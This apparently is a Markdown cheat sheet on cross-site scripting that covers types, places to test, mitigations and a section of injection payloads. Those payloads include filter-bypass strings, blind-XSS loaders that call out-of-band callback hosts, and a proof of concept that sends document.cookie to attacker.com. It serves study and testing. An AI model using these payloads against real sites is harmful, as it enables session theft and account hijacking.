## What is XSS ?
**XSS (Cross-Site Scripting): The application includes untrusted user input in a web page without proper sanitization, letting an attacker inject and execute JavaScript in another user's browser.**

## Why is Dangerous ?
- Steal Session Cookies / Tokens
- Hijack User Accounts
- Perform Actions As The Victim (CSRF-like)
- Keylogging / Credential Harvesting
- Deface Website Content
- Redirect Users To Phishing Pages
- Spread Malware / Worms (Stored XSS)

## Types Of XSS ?
- **Reflected XSS** — Payload in request is immediately reflected in response, no persistence
- **Stored XSS** — Payload saved on server (DB, file) and served to other users later
- **DOM-based XSS** — Payload never touches server; vulnerable JS on the client processes it (innerHTML, eval, etc.)
- **Blind XSS** — Payload fires in a context attacker can't see directly (admin panel, logs) — needs out-of-band callback

## Attack Flow ?
```
Attacker → Injects Malicious Script Into Input
         → Server Reflects/Stores Script Without Sanitizing
         → Victim's Browser Executes Script In Victim's Session

Example:
Normal : User Input → Displayed As Text                    ✅
XSS    : User Input → <script>alert(1)</script> Executed   ❌
XSS    : Comment Field → Stored Script Runs For Every Viewer ❌
```

## Where To Look ? (Recon)
- Search Boxes / Filters
- Comment, Review, Feedback Sections
- Profile Fields (Name, Bio, Website)
- URL Parameters & Fragments (`#`)
- Error Messages That Echo Input
- File Upload Names / Metadata (SVG, HTML files)
- HTTP Headers Reflected In Response (User-Agent, Referer)
- Custom JS Sinks: `innerHTML`, `document.write`, `eval`, `location.hash`

## Payloads ?

**Basic:**
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

**Attribute Breakout:**
```
" onmouseover="alert(1)
'><input onfocus=alert(1) autofocus>
```

**JavaScript Context:**
```
';alert(1);//
</script><script>alert(1)</script>
```

**Filter Bypass:**
```
<ScRiPt>alert(1)</sCriPt>          ← Case mixing
<svg/onload=alert(1)>              ← No space needed
<img src=x onerror=alert`1`>       ← Backtick, no parens
%3Cscript%3Ealert(1)%3C/script%3E  ← URL encoded
```

**DOM-Based (Fragment):**
```
http://target.com/#<img src=x onerror=alert(1)>
```

**Blind XSS Detection:**
```
"><script src=https://YOUR-ID.xss.ht></script>
"><script src=https://YOUR-ID.oast.fun></script>
```

**Session Theft PoC:**
```
<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
```

## Mitigations ?
- Context-Aware Output Encoding (HTML, JS, URL, Attribute)
- Use Framework Auto-Escaping (React, Vue, Angular Templates)
- Set `Content-Security-Policy` Header To Restrict Script Sources
- Set Cookies With `HttpOnly` And `Secure` Flags
- Validate/Sanitize Input On Server Side (Allowlist, Not Blocklist)
- Avoid Dangerous Sinks: `innerHTML`, `eval`, `document.write`
- Use `X-XSS-Protection` And `X-Content-Type-Options: nosniff` Headers
